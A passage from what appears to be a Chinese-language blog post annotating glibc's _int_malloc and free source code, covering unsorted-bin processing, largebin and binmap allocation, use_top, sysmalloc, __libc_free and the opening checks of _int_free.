(fwd != bck)</span><br><span class="line">                &#123;</span><br><span class="line">                  <span class="comment">/* Or with inuse bit to speed comparisons */</span></span><br><span class="line">                  size |= PREV_INUSE;</span><br><span class="line">                  <span class="comment">/* if smaller than smallest, bypass loop below */</span></span><br><span class="line">                  assert ((bck-&gt;bk-&gt;size &amp; NON_MAIN_ARENA) == <span class="number">0</span>);</span><br><span class="line">                  <span class="keyword">if</span> ((<span class="type">unsigned</span> <span class="type">long</span>) (size) &lt; (<span class="type">unsigned</span> <span class="type">long</span>) (bck-&gt;bk-&gt;size))<span class="comment">//小于最小的</span></span><br><span class="line">                    &#123;</span><br><span class="line">                      fwd = bck;</span><br><span class="line">                      bck = bck-&gt;bk;</span><br><span class="line"></span><br><span class="line">                      victim-&gt;fd_nextsize = fwd-&gt;fd;</span><br><span class="line">                      victim-&gt;bk_nextsize = fwd-&gt;fd-&gt;bk_nextsize;</span><br><span class="line">                      fwd-&gt;fd-&gt;bk_nextsize = victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;</span><br><span class="line">                    &#125;</span><br><span class="line">                  <span class="keyword">else</span></span><br><span class="line">                    &#123;</span><br><span class="line">                      assert ((fwd-&gt;size &amp; NON_MAIN_ARENA) == <span class="number">0</span>);<span class="comment">//从大的开始遍历</span></span><br><span class="line">                      <span class="keyword">while</span> ((<span class="type">unsigned</span> <span class="type">long</span>) size &lt; fwd-&gt;size)</span><br><span class="line">                        &#123;</span><br><span class="line">                          fwd = fwd-&gt;fd_nextsize;</span><br><span class="line">                          assert ((fwd-&gt;size &amp; NON_MAIN_ARENA) == <span class="number">0</span>);</span><br><span class="line">                        &#125;</span><br><span class="line"></span><br><span class="line">                      <span class="keyword">if</span> ((<span class="type">unsigned</span> <span class="type">long</span>) size == (<span class="type">unsigned</span> <span class="type">long</span>) fwd-&gt;size)</span><br><span class="line">                        <span class="comment">/* Always insert in the second position.  */</span></span><br><span class="line">                        fwd = fwd-&gt;fd;<span class="comment">//永远插在第一个相同大小的后一个位置,不理会nextsize链</span></span><br><span class="line">                      <span class="keyword">else</span></span><br><span class="line">                        &#123;</span><br><span class="line">                          victim-&gt;fd_nextsize = fwd;<span class="comment">//fd_nextsize指向最近的更小的chunk</span></span><br><span class="line">                          victim-&gt;bk_nextsize = fwd-&gt;bk_nextsize;<span class="comment">//fwd肯定在nextsize链,尾除外</span></span><br><span class="line">                          fwd-&gt;bk_nextsize = victim;</span><br><span class="line">                          victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;</span><br><span class="line">                        &#125;</span><br><span class="line">                      bck = fwd-&gt;bk;<span class="comment">//上一个设置为nextsize链上的</span></span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">              <span class="keyword">else</span></span><br><span class="line">                victim-&gt;fd_nextsize = victim-&gt;bk_nextsize = victim;<span class="comment">//largebin为空</span></span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">          mark_bin (av, victim_index);<span class="comment">//标记binmap</span></span><br><span class="line">          victim-&gt;bk = bck;</span><br><span class="line">          victim-&gt;fd = fwd;</span><br><span class="line">          fwd-&gt;bk = victim;</span><br><span class="line">          bck-&gt;fd = victim;<span class="comment">//链条完整</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MAX_ITERS       10000</span></span><br><span class="line">          <span class="keyword">if</span> (++iters &gt;= MAX_ITERS)<span class="comment">//最多循环10000次</span></span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure><p>遍历只有当完成处理10000次或者unsorted已空才退出</p><ol><li>对victim的size进行检查</li><li>当申请大小处于smallbin范围&amp;&amp;victim为unsortedbin中最后一个chunk&amp;&amp;victim为last_remainer&amp;&amp;size大于申请大小+min_size,采用last_remainer分配</li><li>将victim移除unsorted</li><li>如果size刚好则直接返回</li><li>否则进行进入bin的成链准备</li><li>标志binmap,并彻底成链,unsorted遍历也是唯一一会mark_bin处</li></ol><h4 id="遍历后largebin分配"><a href="#遍历后largebin分配" class="headerlink" title="遍历后largebin分配"></a>遍历后largebin分配</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line">   <span class="keyword">if</span> (!in_smallbin_range (nb))</span><br><span class="line">     &#123;</span><br><span class="line">       bin = bin_at (av, idx);</span><br><span class="line"></span><br><span class="line">       <span class="comment">/* skip scan if empty or largest chunk is too small */</span></span><br><span class="line">       <span class="keyword">if</span> ((victim = first (bin)) != bin &amp;&amp;<span class="comment">//不为空</span></span><br><span class="line">           (<span class="type">unsigned</span> <span class="type">long</span>) (victim-&gt;size) &gt;= (<span class="type">unsigned</span> <span class="type">long</span>) (nb))<span class="comment">//最大的大于需要的才进入</span></span><br><span class="line">         &#123;</span><br><span class="line">           victim = victim-&gt;bk_nextsize;<span class="comment">//从小的开始找</span></span><br><span class="line">           <span class="keyword">while</span> (((<span class="type">unsigned</span> <span class="type">long</span>) (size = chunksize (victim)) &lt;</span><br><span class="line">                   (<span class="type">unsigned</span> <span class="type">long</span>) (nb)))</span><br><span class="line">             victim = victim-&gt;bk_nextsize;</span><br><span class="line"></span><br><span class="line">           <span class="comment">/* Avoid removing the first entry for a size so that the skip</span></span><br><span class="line"><span class="comment">              list does not have to be rerouted.  */</span></span><br><span class="line">           <span class="keyword">if</span> (victim != last (bin) &amp;&amp; victim-&gt;size == victim-&gt;fd-&gt;size)</span><br><span class="line">             victim = victim-&gt;fd;<span class="comment">//尽量不取出nextsize链上的chunk</span></span><br><span class="line"></span><br><span class="line">           remainder_size = size - nb;</span><br><span class="line">           unlink (av, victim, bck, fwd);<span class="comment">//unlink会设置victim的nextsize链</span></span><br><span class="line"></span><br><span class="line">           <span class="comment">/* Exhaust */</span></span><br><span class="line">           <span class="keyword">if</span> (remainder_size &lt; MINSIZE)<span class="comment">//这种情况连多余部分一起分配</span></span><br><span class="line">             &#123;</span><br><span class="line">               set_inuse_bit_at_offset (victim, size);</span><br><span class="line">               <span class="keyword">if</span> (av != &amp;main_arena)</span><br><span class="line">                 victim-&gt;size |= NON_MAIN_ARENA;</span><br><span class="line">             &#125;</span><br><span class="line">           <span class="comment">/* Split */</span></span><br><span class="line">           <span class="keyword">else</span></span><br><span class="line">             &#123;</span><br><span class="line">               remainder = chunk_at_offset (victim, nb);</span><br><span class="line">               <span class="comment">/* We cannot assume the unsorted list is empty and therefore</span></span><br><span class="line"><span class="comment">                  have to perform a complete insert here.  */</span></span><br><span class="line">               bck = unsorted_chunks (av);</span><br><span class="line">               fwd = bck-&gt;fd;</span><br><span class="line"><span class="keyword">if</span> (__glibc_unlikely (fwd-&gt;bk != bck))</span><br><span class="line">                 &#123;</span><br><span class="line">                   errstr = <span class="string">&quot;malloc(): corrupted unsorted chunks&quot;</span>;</span><br><span class="line">                   <span class="keyword">goto</span> errout;</span><br><span class="line">                 &#125;</span><br><span class="line">               remainder-&gt;bk = bck;</span><br><span class="line">               remainder-&gt;fd = fwd;</span><br><span class="line">               bck-&gt;fd = remainder;</span><br><span class="line">               fwd-&gt;bk = remainder;</span><br><span class="line">               <span class="keyword">if</span> (!in_smallbin_range (remainder_size))</span><br><span class="line">                 &#123;</span><br><span class="line">                   remainder-&gt;fd_nextsize = <span class="literal">NULL</span>;</span><br><span class="line">                   remainder-&gt;bk_nextsize = <span class="literal">NULL</span>;</span><br><span class="line">                 &#125;</span><br><span class="line">               set_head (victim, nb | PREV_INUSE |</span><br><span class="line">                         (av != &amp;main_arena ? NON_MAIN_ARENA : <span class="number">0</span>));<span class="comment">//设置取出部分</span></span><br><span class="line">               set_head (remainder, remainder_size | PREV_INUSE);</span><br><span class="line">               set_foot (remainder, remainder_size);<span class="comment">//设置remainder</span></span><br><span class="line">             &#125;</span><br><span class="line">           check_malloced_chunk (av, victim, nb);</span><br><span class="line">           <span class="type">void</span> *p = chunk2mem (victim);</span><br><span class="line">           alloc_perturb (p, bytes);</span><br><span class="line">           <span class="keyword">return</span> p;<span class="comment">//返回</span></span><br><span class="line">         &#125;</span><br><span class="line">     &#125;</span><br></pre></td></tr></table></figure><p>如果对应链不为空且最大的chunk大于申请大小才进入分配</p><ol><li>从最小的开始找起,直到找到第一个比所需大小更大的</li><li>如果有相同大小的chunk,尽量不拿取nextsize链上的</li><li>unlink</li><li>正常流程切割,切割时如果remainer_size小于min_size则连remainer部分一起分配,否则的话切割还要多写一些信息</li></ol><h4 id="binmap情况"><a href="#binmap情况" class="headerlink" title="binmap情况"></a>binmap情况</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br></pre></td><td class="code"><pre><span class="line">   ++idx;</span><br><span class="line">   bin = bin_at (av, idx);</span><br><span class="line">   block = idx2block (idx);</span><br><span class="line">   <span class="built_in">map</span> = av-&gt;binmap[block];</span><br><span class="line">   bit = idx2bit (idx);</span><br><span class="line"></span><br><span class="line">   <span class="keyword">for</span> (;; )</span><br><span class="line">     &#123;</span><br><span class="line">       <span class="comment">/* Skip rest of block if there are no more set bits in this block.  */</span></span><br><span class="line">       <span class="keyword">if</span> (bit &gt; <span class="built_in">map</span> || bit == <span class="number">0</span>)</span><br><span class="line">         &#123;</span><br><span class="line">           <span class="keyword">do</span></span><br><span class="line">             &#123;</span><br><span class="line">               <span class="keyword">if</span> (++block &gt;= BINMAPSIZE) <span class="comment">/* out of bins */</span></span><br><span class="line">                 <span class="keyword">goto</span> use_top;</span><br><span class="line">             &#125;</span><br><span class="line">           <span class="keyword">while</span> ((<span class="built_in">map</span> = av-&gt;binmap[block]) == <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">           bin = bin_at (av, (block &lt;&lt; BINMAPSHIFT));</span><br><span class="line">           bit = <span class="number">1</span>;</span><br><span class="line">         &#125;</span><br><span class="line"></span><br><span class="line">       <span class="comment">/* Advance to bin with set bit. There must be one. */</span></span><br><span class="line">       <span class="keyword">while</span> ((bit &amp; <span class="built_in">map</span>) == <span class="number">0</span>)</span><br><span class="line">         &#123;</span><br><span class="line">           bin = next_bin (bin);</span><br><span class="line">           bit &lt;&lt;= <span class="number">1</span>;</span><br><span class="line">           assert (bit != <span class="number">0</span>);</span><br><span class="line">         &#125;</span><br><span class="line"></span><br><span class="line">       <span class="comment">/* Inspect the bin. It is likely to be non-empty */</span></span><br><span class="line">       victim = last (bin);</span><br><span class="line"></span><br><span class="line">       <span class="comment">/*  If a false alarm (empty bin), clear the bit. */</span></span><br><span class="line">       <span class="keyword">if</span> (victim == bin)<span class="comment">//链为空</span></span><br><span class="line">         &#123;</span><br><span class="line">           av-&gt;binmap[block] = <span class="built_in">map</span> &amp;= ~bit; <span class="comment">/* Write through */</span></span><br><span class="line">           bin = next_bin (bin);</span><br><span class="line">           bit &lt;&lt;= <span class="number">1</span>;</span><br><span class="line">         &#125;</span><br><span class="line"></span><br><span class="line">       <span class="keyword">else</span></span><br><span class="line">         &#123;</span><br><span class="line">           size = chunksize (victim);</span><br><span class="line"></span><br><span class="line">           <span class="comment">/*  We know the first chunk in this bin is big enough to use. */</span></span><br><span class="line">           assert ((<span class="type">unsigned</span> <span class="type">long</span>) (size) &gt;= (<span class="type">unsigned</span> <span class="type">long</span>) (nb));</span><br><span class="line"></span><br><span class="line">           remainder_size = size - nb;</span><br><span class="line"></span><br><span class="line">           <span class="comment">/* unlink */</span></span><br><span class="line">           unlink (av, victim, bck, fwd);<span class="comment">//unlink</span></span><br><span class="line"></span><br><span class="line">           <span class="comment">/* Exhaust */</span></span><br><span class="line">           <span class="keyword">if</span> (remainder_size &lt; MINSIZE)<span class="comment">//多余部分一起分配</span></span><br><span class="line">             &#123;</span><br><span class="line">               set_inuse_bit_at_offset (victim, size);</span><br><span class="line">               <span class="keyword">if</span> (av != &amp;main_arena)</span><br><span class="line">                 victim-&gt;size |= NON_MAIN_ARENA;</span><br><span class="line">             &#125;</span><br><span class="line"></span><br><span class="line">           <span class="comment">/* Split */</span></span><br><span class="line">           <span class="keyword">else</span></span><br><span class="line">             &#123;</span><br><span class="line">               remainder = chunk_at_offset (victim, nb);</span><br><span class="line"></span><br><span class="line">               <span class="comment">/* We cannot assume the unsorted list is empty and therefore</span></span><br><span class="line"><span class="comment">                  have to perform a complete insert here.  */</span></span><br><span class="line">               bck = unsorted_chunks (av);</span><br><span class="line">               fwd = bck-&gt;fd;</span><br><span class="line"><span class="keyword">if</span> (__glibc_unlikely (fwd-&gt;bk != bck))</span><br><span class="line">                 &#123;</span><br><span class="line">                   errstr = <span class="string">&quot;malloc(): corrupted unsorted chunks 2&quot;</span>;</span><br><span class="line">                   <span class="keyword">goto</span> errout;</span><br><span class="line">                 &#125;</span><br><span class="line">               remainder-&gt;bk = bck;</span><br><span class="line">               remainder-&gt;fd = fwd;</span><br><span class="line">               bck-&gt;fd = remainder;<span class="comment">//链接进入unsorted</span></span><br><span class="line">               fwd-&gt;bk = remainder;</span><br><span class="line"></span><br><span class="line">               <span class="comment">/* advertise as last remainder */</span></span><br><span class="line">               <span class="keyword">if</span> (in_smallbin_range (nb))</span><br><span class="line">                 av-&gt;last_remainder = remainder;<span class="comment">//申请大小在smallbin范围,则将剩余部分置为last_remainer</span></span><br><span class="line">               <span class="keyword">if</span> (!in_smallbin_range (remainder_size))</span><br><span class="line">                 &#123;</span><br><span class="line">                   remainder-&gt;fd_nextsize = <span class="literal">NULL</span>;</span><br><span class="line">                   remainder-&gt;bk_nextsize = <span class="literal">NULL</span>;<span class="comment">//nextsize链</span></span><br><span class="line">                 &#125;</span><br><span class="line">               set_head (victim, nb | PREV_INUSE |</span><br><span class="line">                         (av != &amp;main_arena ? NON_MAIN_ARENA : <span class="number">0</span>));</span><br><span class="line">               set_head (remainder, remainder_size | PREV_INUSE);</span><br><span class="line">               set_foot (remainder, remainder_size);</span><br><span class="line">             &#125;</span><br><span class="line">           check_malloced_chunk (av, victim, nb);</span><br><span class="line">           <span class="type">void</span> *p = chunk2mem (victim);</span><br><span class="line">           alloc_perturb (p, bytes);</span><br><span class="line">           <span class="keyword">return</span> p;</span><br><span class="line">         &#125;</span><br><span class="line">     &#125;</span><br></pre></td></tr></table></figure><ol><li>开头先++idx,因为来到这一步,刚好合适的chunk肯定是没有的,从下一个比当前idx大的找起</li><li>获得下一个bin,对应块,对应map(int对象),获得bit位(这个bit位的返回形式是一个int型数字,32个比特位中对应的那一位是1)</li><li>进入循环<ol><li>若当前map没有足够大的chunk分配(bit&gt;map)或者bit在上一次循环中移出界了(bit==0),向下一个map寻找,两种情况会退出,一是map已是最大直接退出前往use_top,二是下一个map存在足够大的chunk,并将bin调整为当前map的第一个,并执行接下来的流程(即接下来的流程若是执行,则一定能找到合适的分配)</li><li>若当前bit没有对应chunk,bit左移一位,bin向下一个移动,知道找到第一个有对应chunk的链</li><li>取victim为找到的链的最后一个chunk,若其为空与标志位不符,则将bin向下一个移动,bit左移一位,并将当前标志位取消,进入下一次循环</li><li>若不为空,则进行正常的切割流程</li></ol></li></ol><h4 id="use-top"><a href="#use-top" class="headerlink" title="use_top"></a>use_top</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line">use_top:</span><br><span class="line">  <span class="comment">/*</span></span><br><span class="line"><span class="comment">     If large enough, split off the chunk bordering the end of memory</span></span><br><span class="line"><span class="comment">     (held in av-&gt;top). Note that this is in accord with the best-fit</span></span><br><span class="line"><span class="comment">     search rule.  In effect, av-&gt;top is treated as larger (and thus</span></span><br><span class="line"><span class="comment">     less well fitting) than any other available chunk since it can</span></span><br><span class="line"><span class="comment">     be extended to be as large as necessary (up to system</span></span><br><span class="line"><span class="comment">     limitations).</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">     We require that av-&gt;top always exists (i.e., has size &gt;=</span></span><br><span class="line"><span class="comment">     MINSIZE) after initialization, so if it would otherwise be</span></span><br><span class="line"><span class="comment">     exhausted by current request, it is replenished. (The main</span></span><br><span class="line"><span class="comment">     reason for ensuring it exists is that we may need MINSIZE space</span></span><br><span class="line"><span class="comment">     to put in fenceposts in sysmalloc.)</span></span><br><span class="line"><span class="comment">   */</span></span><br><span class="line"></span><br><span class="line">  victim = av-&gt;top;</span><br><span class="line">  size = chunksize (victim);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ((<span class="type">unsigned</span> <span class="type">long</span>) (size) &gt;= (<span class="type">unsigned</span> <span class="type">long</span>) (nb + MINSIZE))</span><br><span class="line">    &#123;</span><br><span class="line">      remainder_size = size - nb;</span><br><span class="line">      remainder = chunk_at_offset (victim, nb);</span><br><span class="line">      av-&gt;top = remainder;</span><br><span class="line">      set_head (victim, nb | PREV_INUSE |</span><br><span class="line">                (av != &amp;main_arena ? NON_MAIN_ARENA : <span class="number">0</span>));</span><br><span class="line">      set_head (remainder, remainder_size | PREV_INUSE);</span><br><span class="line"></span><br><span class="line">      check_malloced_chunk (av, victim, nb);</span><br><span class="line">      <span class="type">void</span> *p = chunk2mem (victim);</span><br><span class="line">      alloc_perturb (p, bytes);</span><br><span class="line">      <span class="keyword">return</span> p;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* When we are using atomic ops to free fast chunks we can get</span></span><br><span class="line"><span class="comment">     here for all block sizes.  */</span></span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> (have_fastchunks (av))<span class="comment">//再触发consolidate</span></span><br><span class="line">    &#123;</span><br><span class="line">      malloc_consolidate (av);</span><br><span class="line">      <span class="comment">/* restore original bin index */</span></span><br><span class="line">      <span class="keyword">if</span> (in_smallbin_range (nb))</span><br><span class="line">        idx = smallbin_index (nb);</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">        idx = largebin_index (nb);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><ol><li>如果topchunk的size足够分配,那么从topchunk中进行切割</li><li>若不够,如果有fast chunk则进行malloc_consolidate,并再次计算idx,回到大循环起始,<u>一般是申请small chunk进入大循环才有可能会触发这个选项</u></li><li>若不够,且没有fast chunk,采用sysmalloc</li></ol><h4 id="sysmalloc"><a href="#sysmalloc" class="headerlink" title="sysmalloc"></a>sysmalloc</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="type">void</span> *p = sysmalloc (nb, av);</span><br><span class="line">    <span class="keyword">if</span> (p != <span class="literal">NULL</span>)</span><br><span class="line">      alloc_perturb (p, bytes);</span><br><span class="line">    <span class="keyword">return</span> p;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><h2 id="free"><a href="#free" class="headerlink" title="free"></a>free</h2><h3 id="libc-free"><a href="#libc-free" class="headerlink" title="__libc_free"></a>__libc_free</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span></span><br><span class="line">__libc_free (<span class="type">void</span> *mem)</span><br><span class="line">&#123;</span><br><span class="line">  mstate ar_ptr;</span><br><span class="line">  mchunkptr p;                          <span class="comment">/* chunk corresponding to mem */</span></span><br><span class="line"></span><br><span class="line">  <span class="type">void</span> (*hook) (<span class="type">void</span> *, <span class="type">const</span> <span class="type">void</span> *)</span><br><span class="line">    = atomic_forced_read (__free_hook);</span><br><span class="line">  <span class="keyword">if</span> (__builtin_expect (hook != <span class="literal">NULL</span>, <span class="number">0</span>))</span><br><span class="line">    &#123;</span><br><span class="line">      (*hook)(mem, RETURN_ADDRESS (<span class="number">0</span>));</span><br><span class="line">      <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (mem == <span class="number">0</span>)                              <span class="comment">/* free(0) has no effect */</span></span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">  p = mem2chunk (mem);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (chunk_is_mmapped (p))                       <span class="comment">/* release mmapped memory. */</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="comment">/* see if the dynamic brk/mmap threshold needs adjusting */</span></span><br><span class="line">      <span class="keyword">if</span> (!mp_.no_dyn_threshold</span><br><span class="line">          &amp;&amp; p-&gt;size &gt; mp_.mmap_threshold</span><br><span class="line">          &amp;&amp; p-&gt;size &lt;= DEFAULT_MMAP_THRESHOLD_MAX)</span><br><span class="line">        &#123;</span><br><span class="line">          mp_.mmap_threshold = chunksize (p);</span><br><span class="line">          mp_.trim_threshold = <span class="number">2</span> * mp_.mmap_threshold;</span><br><span class="line">          LIBC_PROBE (memory_mallopt_free_dyn_thresholds, <span class="number">2</span>,</span><br><span class="line">                      mp_.mmap_threshold, mp_.trim_threshold);</span><br><span class="line">        &#125;</span><br><span class="line">      munmap_chunk (p);</span><br><span class="line">      <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  ar_ptr = arena_for_chunk (p);</span><br><span class="line">  _int_free (ar_ptr, p, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line">libc_hidden_def (__libc_free)</span><br></pre></td></tr></table></figure><ol><li>检查__free_hook,有则调用</li><li>free(0)直接返回</li><li>如果是mmap分配的,特殊处理</li><li>调用_int_free (ar_ptr, p, 0);</li></ol><h3 id="int-free"><a href="#int-free" class="headerlink" title="__int_free"></a>__int_free</h3><h4 id="初始操作"><a href="#初始操作" class="headerlink" title="初始操作"></a>初始操作</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (__builtin_expect ((<span class="type">uintptr_t</span>) p &gt; (<span class="type">uintptr_t</span>) -size, <span class="number">0</span>)</span><br><span class="line">      || __builtin_expect (misaligned_chunk (p), <span class="number">0</span>))</span><br><span class="line">    &#123;</span><br><span class="line">      errstr = <span class="string">&quot;free(): invalid pointer&quot;</span>;</span><br><span class="line">    errout:</span><br><span class="line">      <span class="keyword">if</span> (!have_lock &amp;&amp; locked)</span><br><span class="line">        (<span class="type">void</span>) mutex_unlock (&amp;av-&gt;mutex);</span><br><span class="line">      malloc_printerr (check_action, errstr, chunk2mem (p), av);</span><br><span class="line">      <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="comment">/* We know that each chunk is at least MINSIZE bytes in size or a</span></span><br><span class="line"><span class="comment">     multiple of MALLOC_ALIGNMENT.  */</span></span><br><span class="line">  <span class="keyword">if</span> (__glibc_unlikely (size &lt; MINSIZE || !aligned_OK (size)))</span><br><span class="line">    &#123;</span><br><span class="line">      errstr = <span class="string">&quot;free(): invalid size&quot;</span>;</span><br><span class="line">      <span class="keyword">goto</span> errout;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  check_inuse_chunk(av, p);</span><br></pre></td></tr></table></figure><ol><li>如果chunk地址非法或者不对齐,报错</li><li>如果size小于minsize或者不对齐,报错</li><li>check_inuse_chunk(av, p);检查</li></ol><h4 id="fastbin"><a href="#fastbin" class="headerlink" title="fastbin"></a>fastbin</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span 